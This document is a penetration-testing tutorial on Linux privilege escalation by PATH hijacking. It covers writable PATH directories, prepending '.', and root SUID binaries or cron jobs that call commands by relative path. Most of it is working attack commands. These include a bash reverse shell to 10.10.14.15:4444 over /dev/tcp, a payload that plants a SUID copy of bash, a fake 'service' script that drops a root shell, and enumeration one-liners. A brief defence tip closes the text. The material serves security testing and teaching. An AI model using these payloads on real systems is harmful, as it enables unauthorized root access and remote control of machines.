## PATH Abuse

The `PATH` environment variable tells the shell where to look for executables when a command is typed without a full path. When a user types `ls`, the shell searches each directory listed in `PATH` from left to right and runs the first matching file it finds. Abusing this lookup order is a reliable privilege escalation technique when misconfigured scripts, SUID binaries, or cron jobs call commands without specifying their absolute paths.

***

## How PATH Resolution Works

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

The shell checks directories in this exact order. The first match wins. If you can place a file with the same name as a target command in a directory that appears earlier in the PATH than the legitimate binary, your file executes instead.

***

## Attack Vector 1: Writable Directory in PATH

If any directory listed in the current user's PATH is world-writable, you can drop a malicious script there that shadows a legitimate binary called by a privileged process.

```bash
# Check which PATH directories are writable
echo $PATH | tr ':' '\n' | xargs -I{} find {} -maxdepth 0 -writable 2>/dev/null
```

If a root-owned cron job or SUID binary calls a command like `curl`, `python`, or even `cat` without a full path, placing a script with the same name in a writable PATH directory executes your code with the caller's privileges.

Example: a root cron job runs a backup script containing:

```bash
tar czf /backups/home.tar.gz /home
```

If `tar` is called without an absolute path and `/usr/local/sbin` is writable:

```bash
echo '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.15/4444 0>&1' > /usr/local/sbin/tar
chmod +x /usr/local/sbin/tar
```

The next time the cron job runs, your `tar` executes as root.

***

## Attack Vector 2: Injecting `.` into PATH

Adding `.` (the current working directory) to the beginning of the PATH means any script in the current directory takes priority over system binaries of the same name.

```bash
# Inject current directory at the start of PATH
PATH=.:${PATH}
export PATH
echo $PATH
# .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Now create a malicious script named after any common command:

```bash
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
ls
# PATH ABUSE!!
```

In a real exploitation scenario, replace the echo payload with something useful:

```bash
# Spawn a root shell if a privileged process runs this
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > ls
chmod +x ls
```

When a privileged process or script in the same directory runs `ls`, it executes your file instead, copying bash with the SUID bit set.

***

## Attack Vector 3: Relative Path in SUID Binary or Script

This is the most impactful version. When a SUID binary owned by root calls a command using a relative path (no leading `/`), you control which binary runs by manipulating the PATH before executing the SUID file.

```bash
# Find SUID binaries
find / -perm -4000 -user root -type f 2>/dev/null

# Use strings to check if a SUID binary calls commands without absolute paths
strings /usr/local/bin/suid-binary | grep -v "/"
# Output might show: service, curl, python, cp, etc.
```

If a SUID binary calls `service apache2 start` without an absolute path, exploit it:

```bash
# Create malicious 'service' binary in a writable location
echo '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run the SUID binary
/usr/local/bin/suid-binary
# Drops a root shell because /tmp/service runs instead of /usr/sbin/service
```

***

## Identifying PATH Abuse Opportunities

```bash
# Check current PATH
echo $PATH

# Find writable directories currently in PATH
for dir in $(echo $PATH | tr ':' '\n'); do
    [ -w "$dir" ] && echo "WRITABLE: $dir"
done

# Find SUID binaries and check them with strings for relative calls
find / -perm -4000 -user root -type f 2>/dev/null | while read bin; do
    strings "$bin" 2>/dev/null | grep -E "^[a-z][a-z0-9_-]+$" | while read cmd; do
        echo "$bin calls: $cmd (relative)"
    done
done

# Find scripts run by root cron jobs that use relative commands
cat /etc/crontab
grep -r "^[^#]" /etc/cron* 2>/dev/null
```

***

## Quick Reference

| Scenario | Condition Required | Exploitation Method |
|---|---|---|
| Writable PATH directory | Any directory in `$PATH` is world-writable | Drop malicious script matching a command called by a privileged process |
| `.` in PATH | Current dir is in PATH before system dirs | Create local script named after a system binary |
| SUID binary relative call | SUID root binary calls command without `/` | Prepend writable dir to PATH, place malicious script there |
| Root cron job relative call | Cron script calls command without absolute path | Same as SUID approach, wait for cron to trigger |

The core defence against all of these is simple: always use absolute paths in scripts, cron jobs, and setuid programs. As a tester, any script running with elevated privileges that contains a bare command name without a full path is a candidate for this attack.
